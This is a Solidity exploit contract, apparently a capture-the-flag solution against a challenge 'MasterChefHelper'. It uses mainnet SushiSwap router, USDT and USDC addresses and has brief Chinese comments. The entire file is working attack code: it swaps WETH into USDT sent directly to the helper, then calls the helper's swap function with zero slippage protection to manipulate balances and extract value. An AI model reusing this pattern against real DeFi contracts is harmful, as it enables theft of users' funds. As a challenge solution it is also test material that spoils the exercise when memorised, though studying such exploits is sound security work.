// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "../public/contracts/Setup.sol";

contract Exploit {

    constructor(Setup setup) payable {

        WETH9 weth = setup.weth();
		MasterChefHelper mcHelper = setup.mcHelper();
        UniswapV2RouterLike router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        address usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
		weth.approve(address(router), type(uint256).max);

		weth.deposit{value: 13 ether}();

		address[] memory path = new address[](2);

		// 用12weth换出usdt，给mcHelper
		path[0] = address(weth);
		path[1] = usdt;
		router.swapExactTokensForTokens(
			12 ether,
			0,
			path,
			address(mcHelper),
			block.timestamp
		);

		// 用1weth换出usdc，给本合约
		path[0] = address(weth);
		path[1] = usdc;
		router.swapExactTokensForTokens(
			1 ether,
			0,
			path,
			address(this),
			block.timestamp
		);

		uint256 usdcAmountIn = 50 * 10 ** 6;
		ERC20Like(usdc).approve(address(mcHelper), type(uint256).max);
		mcHelper.swapTokenForPoolToken(0, usdc, usdcAmountIn, 0);
    }
}
